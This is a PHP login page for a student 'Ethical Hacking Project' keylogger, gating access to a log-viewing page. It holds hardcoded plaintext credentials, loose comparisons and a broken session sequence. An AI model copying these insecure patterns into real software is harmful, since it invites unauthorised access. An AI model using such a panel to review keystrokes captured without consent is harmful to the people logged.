<?php
    // clear session
    session_start();
    session_destroy();

    require_once('include.php');

    // make sure login info is coming from a POST request
    $req_method = $_SERVER['REQUEST_METHOD'];
    if (strcmp($req_method, 'POST') == 0)
    {
        // check login
        $username = $_POST['username'];
        $password = $_POST['password'];

        if ($username == "ehacking" && $password == "l33tkeyl0g")
        {
            // valid credentials, authenticate with session
            $_SESSION[LOGIN_TOKEN] = "VALID";

            // go to viewlog file
            header('Location: viewlog.php', true);
        }
        else
            // invalid credentials...off to google!
            header('Location: http://www.google.com', true);
    }
?>

<html>

    <head>
        <link rel="stylesheet" type="text/css" href="style.css">
        <title>Ethical Hacking Project</title>
    </head>

    <body>
        <div class="loginform">
            <h2>Simple Keylogger Login</h2>
            <form name="login" action="index.php" method="post">
                <ul>
                    <li><input type="text" name="username" placeholder="enter username" required></li>
                    <li><input type="password" name="password" placeholder="enter password" required></li>
                    <li><input type="submit" value="Login"></li>
                </ul>
            </form>
        </div>
    </body>

</html>